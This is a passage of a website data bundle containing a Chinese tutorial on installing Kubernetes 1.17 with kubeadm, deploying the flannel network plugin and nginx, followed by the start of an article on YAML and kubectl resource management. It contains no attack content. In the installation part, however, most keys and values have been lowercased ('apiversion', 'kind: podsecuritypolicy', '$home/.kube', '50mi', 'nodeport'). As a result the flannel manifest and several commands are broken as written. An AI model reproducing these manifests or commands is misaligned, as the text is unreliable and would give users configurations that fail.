/etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=kubernetes\nbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=0\nrepo_gpgcheck=0\ngpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n安装 kubeadm、kubelet 和 kubectl\n\nyum install --setopt=obsoletes=0 kubeadm-1.17.4-0 kubelet-1.17.4-0 kubectl-1.17.4-0\n\n\n1\n\n\n设置 kubelet 开机自启动\n\nsystemctl enable kubelet\n\n\n1\n\n\n\n# 2.10 集群初始化\n\n# 准备镜像\n\nkubeadm config images list\n\nimages=(\n    kube-apiserver:v1.17.4\n    kube-controller-manager:v1.17.4\n    kube-scheduler:v1.17.4\n    kube-proxy:v1.17.4\n    pause:3.1\n    etcd:3.4.3-0\n    coredns:1.6.5\n)\n\n\nfor imagename in ${images[@]} ;do\n    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename\n    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename k8s.gcr.io/$imagename\n    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imagename\ndone\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 初始化\n\n在 master 点操作如下\n\nkubeadm init \\\n  --kubernetes-version=v1.17.4 \\\n  --pod-network-cidr=10.244.0.0/16 \\\n  --service-cidr=10.96.0.0/12  \\\n  --apiserver-advertise-address=10.240.30.113\n\n\n1\n2\n3\n4\n5\n\n * kubernetes-version 为版本\n * pod-network-cidr 指定 pod 网络\n * service-cidr 指定 service 网络\n * apiserver-advertise-address 指定 master 的 ip 地址\n * image-repository registry.aliyuncs.com/google_containers 指定镜像源为阿里，前面已经拉取过镜像了，所以不需要在拉\n\n# 安装过程中报错如果报错，查看日志\njournalctl -xfeu kubelet\n\n# 重置 kubeadm 的信息\nkubeadm reset\n\n\n1\n2\n3\n4\n5\n\n\n在 master 点创建必要的文件，是 kubectl 以后要执行的配置文件\n\n  mkdir -p $home/.kube\n  sudo cp -i /etc/kubernetes/admin.conf $home/.kube/config\n  sudo chown $(id -u):$(id -g) $home/.kube/config\n\n\n1\n2\n3\n\n\n其他子节点执行，安装成功后会有信息告诉你\n\nkubeadm join 192.168.81.101:6443 --token d5ejth.9s60snjt5xlh9lnt \\\n    --discovery-token-ca-cert-hash sha256:04aab4993001f66f607e959b120294eddcc8579a5ea7d7364f48d84caecc90c9\n\n\n1\n2\n\n\n查看所有节点\n\nkubectl get nodes\n\n\n1\n\n\n\n# 2.11 安装网络插件\n\nkubernetes 支持多种网络插件，比如 flannel、calico、canal 等等，任选一种使用即可，本次选择 flannel\n\n# master 操作\n\n创建文件，复制执内容到文件中\n\ncat <<eof > kube-flannel.yml\n---\napiversion: policy/v1beta1\nkind: podsecuritypolicy\nmetadata:\n  name: psp.flannel.unprivileged\n  annotations:\n    seccomp.security.alpha.kubernetes.io/allowedprofilenames: docker/default\n    seccomp.security.alpha.kubernetes.io/defaultprofilename: docker/default\n    apparmor.security.beta.kubernetes.io/allowedprofilenames: runtime/default\n    apparmor.security.beta.kubernetes.io/defaultprofilename: runtime/default\nspec:\n  privileged: false\n  volumes:\n    - configmap\n    - secret\n    - emptydir\n    - hostpath\n  allowedhostpaths:\n    - pathprefix: "/etc/cni/net.d"\n    - pathprefix: "/etc/kube-flannel"\n    - pathprefix: "/run/flannel"\n  readonlyrootfilesystem: false\n  # users and groups\n  runasuser:\n    rule: runasany\n  supplementalgroups:\n    rule: runasany\n  fsgroup:\n    rule: runasany\n  # privilege escalation\n  allowprivilegeescalation: false\n  defaultallowprivilegeescalation: false\n  # capabilities\n  allowedcapabilities: [\'net_admin\']\n  defaultaddcapabilities: []\n  requireddropcapabilities: []\n  # host namespaces\n  hostpid: false\n  hostipc: false\n  hostnetwork: true\n  hostports:\n  - min: 0\n    max: 65535\n  # selinux\n  selinux:\n    # selinux is unused in caasp\n    rule: \'runasany\'\n---\nkind: clusterrole\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nrules:\n  - apigroups: [\'extensions\']\n    resources: [\'podsecuritypolicies\']\n    verbs: [\'use\']\n    resourcenames: [\'psp.flannel.unprivileged\']\n  - apigroups:\n      - ""\n    resources:\n      - pods\n    verbs:\n      - get\n  - apigroups:\n      - ""\n    resources:\n      - nodes\n    verbs:\n      - list\n      - watch\n  - apigroups:\n      - ""\n    resources:\n      - nodes/status\n    verbs:\n      - patch\n---\nkind: clusterrolebinding\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: flannel\nroleref:\n  apigroup: rbac.authorization.k8s.io\n  kind: clusterrole\n  name: flannel\nsubjects:\n- kind: serviceaccount\n  name: flannel\n  namespace: kube-system\n---\napiversion: v1\nkind: serviceaccount\nmetadata:\n  name: flannel\n  namespace: kube-system\n---\nkind: configmap\napiversion: v1\nmetadata:\n  name: kube-flannel-cfg\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\ndata:\n  cni-conf.json: |\n    {\n      "name": "cbr0",\n      "cniversion": "0.3.1",\n      "plugins": [\n        {\n          "type": "flannel",\n          "delegate": {\n            "hairpinmode": true,\n            "isdefaultgateway": true\n          }\n        },\n        {\n          "type": "portmap",\n          "capabilities": {\n            "portmappings": true\n          }\n        }\n      ]\n    }\n  net-conf.json: |\n    {\n      "network": "10.244.0.0/16",\n      "backend": {\n        "type": "vxlan"\n      }\n    }\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-amd64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - amd64\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-amd64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n            add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-arm64\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - arm64\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm64\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-arm\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - arm\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-arm\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-ppc64le\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - ppc64le\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-ppc64le\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\n---\napiversion: apps/v1\nkind: daemonset\nmetadata:\n  name: kube-flannel-ds-s390x\n  namespace: kube-system\n  labels:\n    tier: node\n    app: flannel\nspec:\n  selector:\n    matchlabels:\n      app: flannel\n  template:\n    metadata:\n      labels:\n        tier: node\n        app: flannel\n    spec:\n      affinity:\n        nodeaffinity:\n          requiredduringschedulingignoredduringexecution:\n            nodeselectorterms:\n              - matchexpressions:\n                  - key: beta.kubernetes.io/os\n                    operator: in\n                    values:\n                      - linux\n                  - key: beta.kubernetes.io/arch\n                    operator: in\n                    values:\n                      - s390x\n      hostnetwork: true\n      tolerations:\n      - operator: exists\n        effect: noschedule\n      serviceaccountname: flannel\n      initcontainers:\n      - name: install-cni\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - cp\n        args:\n        - -f\n        - /etc/kube-flannel/cni-conf.json\n        - /etc/cni/net.d/10-flannel.conflist\n        volumemounts:\n        - name: cni\n          mountpath: /etc/cni/net.d\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      containers:\n      - name: kube-flannel\n        image: quay.io/coreos/flannel:v0.11.0-s390x\n        command:\n        - /opt/bin/flanneld\n        args:\n        - --ip-masq\n        - --kube-subnet-mgr\n        resources:\n          requests:\n            cpu: "100m"\n            memory: "50mi"\n          limits:\n            cpu: "100m"\n            memory: "50mi"\n        securitycontext:\n          privileged: false\n          capabilities:\n             add: ["net_admin"]\n        env:\n        - name: pod_name\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.name\n        - name: pod_namespace\n          valuefrom:\n            fieldref:\n              fieldpath: metadata.namespace\n        volumemounts:\n        - name: run\n          mountpath: /run/flannel\n        - name: flannel-cfg\n          mountpath: /etc/kube-flannel/\n      volumes:\n        - name: run\n          hostpath:\n            path: /run/flannel\n        - name: cni\n          hostpath:\n            path: /etc/cni/net.d\n        - name: flannel-cfg\n          configmap:\n            name: kube-flannel-cfg\neof\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n372\n373\n374\n375\n376\n377\n378\n379\n380\n381\n382\n383\n384\n385\n386\n387\n388\n389\n390\n391\n392\n393\n394\n395\n396\n397\n398\n399\n400\n401\n402\n403\n404\n405\n406\n407\n408\n409\n410\n411\n412\n413\n414\n415\n416\n417\n418\n419\n420\n421\n422\n423\n424\n425\n426\n427\n428\n429\n430\n431\n432\n433\n434\n435\n436\n437\n438\n439\n440\n441\n442\n443\n444\n445\n446\n447\n448\n449\n450\n451\n452\n453\n454\n455\n456\n457\n458\n459\n460\n461\n462\n463\n464\n465\n466\n467\n468\n469\n470\n471\n472\n473\n474\n475\n476\n477\n478\n479\n480\n481\n482\n483\n484\n485\n486\n487\n488\n489\n490\n491\n492\n493\n494\n495\n496\n497\n498\n499\n500\n501\n502\n503\n504\n505\n506\n507\n508\n509\n510\n511\n512\n513\n514\n515\n516\n517\n518\n519\n520\n521\n522\n523\n524\n525\n526\n527\n528\n529\n530\n531\n532\n533\n534\n535\n536\n537\n538\n539\n540\n541\n542\n543\n544\n545\n546\n547\n548\n549\n550\n551\n552\n553\n554\n555\n556\n557\n558\n559\n560\n561\n562\n563\n564\n565\n566\n567\n568\n569\n570\n571\n572\n573\n574\n575\n576\n577\n578\n579\n580\n581\n582\n583\n584\n585\n586\n587\n588\n589\n590\n591\n592\n593\n594\n595\n596\n597\n598\n599\n600\n601\n602\n603\n604\n\n\n执行以下命令\n\nkubectl apply -f kube-flannel.yml \n\n\n1\n\n\n查看节点状态，只要从 notready 到 ready 就算成功\n\n\n# 服务部署\n\n部署一个 nginx 程序，测试下集群是否在正常工作，直接在 master 操作\n\n# 部署nginx\nkubectl create deployment nginx --image=nginx:1.14-alpine\n# 暴露端口\nkubectl expose deployment nginx --port=80 --type=nodeport\n\n# 查看服务状态\n[root@localhost package]# kubectl get pods,svc\nname                         ready   status    restarts   age\npod/nginx-6867cdf567-2l7tr   1/1     running   0          50s\n\nname                 type        cluster-ip       external-ip   port(s)        age\nservice/kubernetes   clusterip   10.96.0.1        <none>        443/tcp        71m\nservice/nginx        nodeport    10.101.119.180   <none>        80:31543/tcp   35s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n31543 这个端口就是外部端口，可以通过节点名称 + 端口号直接访问测试',charsets:{cjk:!0}},{title:"kubernetes(三) 资源管理",frontmatter:{title:"kubernetes(三) 资源管理",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/602",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/602.kubernetes(%E4%B8%89)%20%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86.html",relativePath:"04.运维/60.Kubernetes/602.kubernetes(三) 资源管理.md",key:"v-1cf8c197",path:"/kubernetes/602/",headers:[{level:2,title:"资源管理介绍",slug:"资源管理介绍",normalizedTitle:"资源管理介绍",charIndex:2},{level:2,title:"YAML语言介绍",slug:"yaml语言介绍",normalizedTitle:"yaml 语言介绍",charIndex:448},{level:2,title:"资源管理方式",slug:"资源管理方式",normalizedTitle:"资源管理方式",charIndex:1715},{level:3,title:"命令式对象管理",slug:"命令式对象管理",normalizedTitle:"命令式对象管理",charIndex:1726},{level:4,title:"kubectl命令",slug:"kubectl命令",normalizedTitle:"kubectl 命令",charIndex:2174},{level:4,title:"资源类型",slug:"资源类型",normalizedTitle:"资源类型",charIndex:2368},{level:4,title:"操作",slug:"操作",normalizedTitle:"操作",charIndex:43},{level:3,title:"命令式对象配置",slug:"命令式对象配置",normalizedTitle:"命令式对象配置",charIndex:1817},{level:3,title:"声明式对象配置",slug:"声明式对象配置",normalizedTitle:"声明式对象配置",charIndex:1899}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"资源管理介绍 YAML语言介绍 资源管理方式 命令式对象管理 kubectl命令 资源类型 操作 命令式对象配置 声明式对象配置",content:'# 资源管理介绍\n\n在 kubernetes 中，所有的内容都抽象为资源，用户需要通过操作资源来管理 kubernetes。\n\n> kubernetes 的本质上就是一个集群系统，用户可以在集群中部署各种服务，所谓的部署服务，其实就是在 kubernetes 集群中运行一个个的容器，并将指定的程序跑在容器中。\n> \n> kubernetes 的最小管理单元是 pod 而不是容器，所以只能将容器放在 Pod 中，而 kubernetes 一般也不会直接管理 Pod，而是通过 Pod控制器 来管理 Pod 的。\n> \n> Pod 可以提供服务之后，就要考虑如何访问 Pod 中服务，kubernetes 提供了 Service 资源实现这个功能。\n> \n> 当然，如果 Pod 中程序的数据需要持久化，kubernetes 还提供了各种 存储 系统。\n\n\n\n> 学习 kubernetes 的核心，就是学习如何对集群上的 Pod、Pod控制器、Service、存储 等各种资源进行操作\n\n\n# YAML 语言介绍\n\nYAML 是一个类似 XML、JSON 的标记性语言。它强调以数据为中心，并不是以标识语言为重点。因而 YAML 本身的定义比较简单，号称 "一种人性化的数据格式语言"。\n\n# xml 语法 或 html语法\n<heima>\n    <age>15</age>\n    <address>Beijing</address>\n</heima>\n\n\n1\n2\n3\n4\n5\n\n\n# yaml 语法\nheima:\n  age: 15\n  address: Beijing\n\n\n1\n2\n3\n4\n\n\nYAML 的语法比较简单，主要有下面几个：\n\n * 大小写敏感\n * 使用缩进表示层级关系\n * 缩进不允许使用 tab，只允许空格 (低版本限制)\n * 缩进的空格数不重要，只要相同层级的元素左对齐即可\n * \'#\' 表示注释\n\nYAML 支持以下几种数据类型：\n\n * 纯量：单个的、不可再分的值\n * 对象：键值对的集合，又称为映射（mapping）/ 哈希（hash） / 字典（dictionary）\n * 数组：一组按次序排列的值，又称为序列（sequence） / 列表（list）\n\n# 纯量, 就是指的一个简单的值，字符串、布尔值、整数、浮点数、Null、时间、日期\n# 1 布尔类型\nc1: true (或者True)\n# 2 整型\nc2: 234\n# 3 浮点型\nc3: 3.14\n# 4 null类型 \nc4: ~  # 使用~表示null\n# 5 日期类型\nc5: 2018-02-17    # 日期必须使用ISO 8601格式，即yyyy-MM-dd\n# 6 时间类型\nc6: 2018-02-17T15:02:31+08:00  # 时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区\n# 7 字符串类型\nc7: heima     # 简单写法，直接写值 , 如果字符串中间有特殊字符，必须使用双引号或者单引号包裹 \nc8: line1\n    line2     # 字符串过多的情况可以拆成多行，每一行会被转化成一个空格\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 对象\n# 形式一(推荐):\nheima:\n  age: 15\n  address: Beijing\n# 形式二(了解):\nheima: {age: 15,address: Beijing}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 数组\n# 形式一(推荐):\naddress:\n  - 顺义\n  - 昌平  \n# 形式二(了解):\naddress: [顺义,昌平]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> 小提示：\n> 1 书写 yaml 切记 : 后面要加一个空格\n> 2 如果需要将多段 yaml 配置放在一个文件中，中间要使用 --- 分隔\n> 3 下面是一个 yaml 转 json 的网站，可以通过它验证 yaml 是否书写正确\n\n\n# 资源管理方式\n\n * 命令式对象管理：直接使用命令去操作 kubernetes 资源\n   kubectl run nginx-pod --image=nginx:1.17.1 --port=80\n * 命令式对象配置：通过命令配置和配置文件去操作 kubernetes 资源\n   kubectl create/patch -f nginx-pod.yaml\n * 声明式对象配置：通过 apply 命令和配置文件去操作 kubernetes 资源\n   kubectl apply -f nginx-pod.yaml\n\n类型        操作对象   适用环境   优点        缺点\n命令式对象管理   对象     测试     简单        只能操作活动对象，无法审计、跟踪\n命令式对象配置   文件     开发     可以审计、跟踪   项目大时，配置文件多，操作麻烦\n声明式对象配置   目录     开发     支持目录操作    意外情况下难以调试\n\n\n# 命令式对象管理\n\n# kubectl 命令\n\nkubectl 是 kubernetes 集群的命令行工具，通过它能够对集群本身进行管理，并能够在集群上进行容器化应用的安装部署。kubectl 命令的语法如下：\n\nkubectl [command] [type] [name] [flags]\n\n\n1\n\n * command：指定要对资源执行的操作，例如 create、get、delete\n * type：指定资源类型，比如 deployment、pod、service\n * name：指定资源的名称，名称大小写敏感\n * flags：指定额外的可选参数\n\n# 查看所有pod\nkubectl get pod \n\n# 查看某个pod\nkubectl get pod pod_name\n\n# 查看某个pod,以yaml格式展示结果\nkubectl get pod pod_name -o yaml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 资源类型\n\nkubernetes 中所有的内容都抽象为资源，可以通过下面的命令进行查看:\n\nkubectl api-resources\n\n\n1\n\n\n经常使用的资源有下面这些：\n\n资源分类         资源名称                       缩写       资源作用\n集群级别资源       nodes                      no       集群组成部分\nnamespaces   ns                         隔离 Pod   \npod 资源       pods                       po       装载容器\npod 资源控制器    replicationcontrollers     rc       控制 pod 资源\n             replicasets                rs       控制 pod 资源\n             deployments                deploy   控制 pod 资源\n             daemonsets                 ds       控制 pod 资源\n             jobs                                控制 pod 资源\n             cronjobs                   cj       控制 pod 资源\n             horizontalpodautoscalers   hpa      控制 pod 资源\n             statefulsets               sts      控制 pod 资源\n服务发现资源       services                   svc      统一 pod 对外接口\n             ingress                    ing      统一 pod 对外接口\n存储资源         volumeattachments                   存储\n             persistentvolumes          pv       存储\n             persistentvolumeclaims     pvc      存储\n配置资源         configmaps                 cm       配置\n             secrets                             配置\n\n# 操作\n\nkubernetes 允许对资源进行多种操作，可以通过 --help 查看详细的操作命令\n\nkubectl --help\n\n\n1\n\n\n经常使用的操作有下面这些：\n\n命令分类    命令             翻译                 命令作用\n基本命令    create         创建                 创建一个资源\n        edit           编辑                 编辑一个资源\n        get            获取                 获取一个资源\n        patch          更新                 更新一个资源\n        delete         删除                 删除一个资源\n        explain        解释                 展示资源文档\n运行和调试   run            运行                 在集群中运行一个指定的镜像\n        expose         暴露                 暴露资源为 Service\n        describe       描述                 显示资源内部信息\n        logs           日志输出容器在 pod 中的日志   输出容器在 pod 中的日志\n        attach         缠绕进入运行中的容器         进入运行中的容器\n        exec           执行容器中的一个命令         执行容器中的一个命令\n        cp             复制                 在 Pod 内外复制文件\n        rollout        首次展示               管理资源的发布\n        scale          规模                 扩 (缩) 容 Pod 的数量\n        autoscale      自动调整               自动调整 Pod 的数量\n高级命令    apply          rc                 通过文件对资源进行配置\n        label          标签                 更新资源上的标签\n其他命令    cluster-info   集群信息               显示集群信息\n        version        版本                 显示当前 Server 和 Client 的版本\n\n下面以一个 namespace /pod 的创建和删除简单演示下命令的使用：\n\n# 创建一个namespace\n[root@master ~]# kubectl create namespace dev\nnamespace/dev created\n\n# 获取namespace\n[root@master ~]# kubectl get ns\nNAME              STATUS   AGE\ndefault           Active   21h\ndev               Active   21s\nkube-node-lease   Active   21h\nkube-public       Active   21h\nkube-system       Active   21h\n\n# 在此namespace下创建并运行一个nginx的Pod\n[root@master ~]# kubectl run pod --image=nginx:latest -n dev\nkubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead.\ndeployment.apps/pod created\n\n# 查看新创建的pod\n[root@master ~]# kubectl get pod -n dev\nNAME  READY   STATUS    RESTARTS   AGE\npod   1/1     Running   0          21s\n\n# 删除指定的pod\n[root@master ~]# kubectl delete pod pod-864f9875b9-pcw7x\npod "pod" deleted\n\n# 删除指定的namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 命令式对象配置\n\n命令式对象配置就是使用命令配合配置文件一起来操作 kubernetes 资源。\n1） 创建一个 nginxpod.yaml，内容如下：\n\n# 版本\napiVersion: v1\n# 类型\nkind: Namespace\n# 元数据\nmetadata:\n  # 名称\n  name: dev\n\n---\n\napiVersion: v1\nkind: Pod\nmetadata:\n  # 名称\n  name: nginxpod\n  # 所在命名空间\n  namespace: dev\n# 详细描述\nspec:\n  containers:\n  # 容器的名字\n  - name: nginx-containers\n    # 容器所用的镜像\n    image: 